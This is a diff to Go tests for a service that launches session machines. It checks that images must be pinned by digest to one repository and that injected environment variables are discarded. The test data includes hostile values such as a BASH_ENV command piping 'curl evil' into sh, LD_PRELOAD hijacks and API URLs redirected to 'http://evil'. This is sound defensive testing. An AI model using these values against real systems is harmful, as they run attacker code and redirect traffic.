@@ -29,6 +29,7 @@ type fakeFly struct {
 	token    string
 	env      map[string]string // the last created machine's env
 	failInit bool
+	swap     string // report this digest instead of the requested one (a registry serving other bytes)
 }
 
 func newFakeFly() *fakeFly { return &fakeFly{machines: map[string]*fakeMachine{}} }
@@ -41,7 +42,14 @@ func (f *fakeFly) Create(r StartRequest) (string, string, error) {
 	s, _ := ecdh.P256().GenerateKey(rand.Reader)
 	f.machines[id] = &fakeMachine{enc: e, sig: s}
 	f.env = r.Env
-	return id, strings.SplitN(r.Image, "@", 2)[0] + "@sha256:abc", nil
+	ref, digest, _ := strings.Cut(r.Image, "@")
+	if f.swap != "" {
+		digest = f.swap
+	}
+	if i := strings.LastIndex(ref, ":"); i > strings.LastIndex(ref, "/") {
+		ref = ref[:i] // Fly reports registry/repository@digest
+	}
+	return id, ref + "@" + digest, nil
 }
 func (f *fakeFly) Init(id string) (MachineKeys, error) {
 	if f.failInit {
@@ -111,7 +119,7 @@ func pl(t *testing.T) func(SignedDoc, error) map[string]any {
 	}
 }
 
-const img = "ghcr.io/de0ch/jarvis2-session:1"
+const img = "ghcr.io/de0ch/jarvis2-session:1@sha256:1111111111111111111111111111111111111111111111111111111111111111"
 
 var testValues = map[string]map[string]string{
 	"default":    {"A": "1", "B": "2"},
@@ -403,11 +411,15 @@ func TestMachinesGetTheCoreKeyFromTheCore(t *testing.T) {
 	if f.env[coreKeyEnv] != c.Key()["signingKey"] {
 		t.Fatal("the machine wasn't given the core's key")
 	}
-	// the router can't plant another one
-	if _, err := c.Start(StartRequest{Image: img, Env: map[string]string{coreKeyEnv: "evil", "X": "1"}}); err != nil {
+	// the router can't plant another one, nor anything else: the core sets the whole env
+	evil := map[string]string{coreKeyEnv: "evil", "X": "1", "LD_PRELOAD": "/tmp/x.so", "BASH_ENV": "$(curl evil|sh)",
+		"NODE_OPTIONS": "--require /tmp/x.js", "PATH": "/tmp", "JARVIS2_URL": "http://evil", "ANTHROPIC_BASE_URL": "http://evil",
+		"JARVIS2_ROLLBACK": "x", "JARVIS2_RESTORE_CERT": "{}", "SESSION_PROMPT": "do evil", "SESSION_REPOS": "https://github.com/evil/x"}
+	if _, err := c.Start(StartRequest{Image: img, Env: evil}); err != nil {
 		t.Fatal(err)
 	}
-	if f.env[coreKeyEnv] != c.Key()["signingKey"] || f.env["X"] != "1" {
+	want := map[string]string{coreKeyEnv: c.Key()["signingKey"], machineURLEnv: defaultMachineURL}
+	if len(f.env) != len(want) || f.env[coreKeyEnv] != want[coreKeyEnv] || f.env[machineURLEnv] != want[machineURLEnv] {
 		t.Fatalf("got %v", f.env)
 	}
 }
@@ -511,7 +523,13 @@ func TestAnApprovalMakesOneMachine(t *testing.T) {
 		t.Fatal("a machine whose init failed was left running")
 	}
 	f.failInit = false
-	other := pl(t)(c.Start(StartRequest{Image: "ghcr.io/de0ch/other:1"}))["machine"].(map[string]any)["id"].(string)
+	for _, bad := range []string{"ghcr.io/de0ch/other:1", "ghcr.io/de0ch/other@sha256:" + strings.Repeat("1", 64),
+		"ghcr.io/de0ch/jarvis2-session:1", "ghcr.io/de0ch/jarvis2-session:latest", "evil.io/de0ch/jarvis2-session@sha256:" + strings.Repeat("1", 64)} {
+		if _, err := c.Start(StartRequest{Image: bad}); err == nil {
+			t.Fatalf("started %s (another repository, or not pinned by digest)", bad)
+		}
+	}
+	other := pl(t)(c.Start(StartRequest{Image: "ghcr.io/de0ch/jarvis2-session:3@sha256:" + strings.Repeat("3", 64)}))["machine"].(map[string]any)["id"].(string)
 	if _, err := c.Certify(&a, other); err == nil {
 		t.Fatal("certified a machine running another image")
 	}
@@ -571,7 +589,7 @@ func TestApproveByDeadMachineRefusesChanges(t *testing.T) {
 	for _, in := range []SuccessionInput{
 		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default", "gmail"}},
 		{Predecessor: &cert, Image: oc.Machine.Image, Stores: []string{"default"}, Options: Options{Harness: "opencode"}},
-		{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2", Stores: []string{"default"}},
+		{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}},
 	} {
 		ch, _ := c.Succession(in)
 		if _, err := c.ApproveByDeadMachine(&ch); err == nil {
@@ -584,13 +602,13 @@ func TestUpgradeIsApprovedBeforeTheOldMachineGoes(t *testing.T) {
 	c, _, p := setup(t)
 	cert, old := newLine(t, c, p, "default")
 	// the iPhone approves the new image before the old machine is killed
-	a := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2", Stores: []string{"default"}})
+	a := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}})
 	if _, err := tryStart(c, a); err == nil {
 		t.Fatal("started a successor while the predecessor runs")
 	}
 	c.Kill(old)
 	start(t, c, a)
-	a2 := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2", Stores: []string{"default"}})
+	a2 := approve(t, c, p, SuccessionInput{Predecessor: &cert, Image: "ghcr.io/de0ch/jarvis2-session:2@sha256:2222222222222222222222222222222222222222222222222222222222222222", Stores: []string{"default"}})
 	if _, err := tryStart(c, a2); err == nil {
 		t.Fatal("a used predecessor got a second successor")
 	}
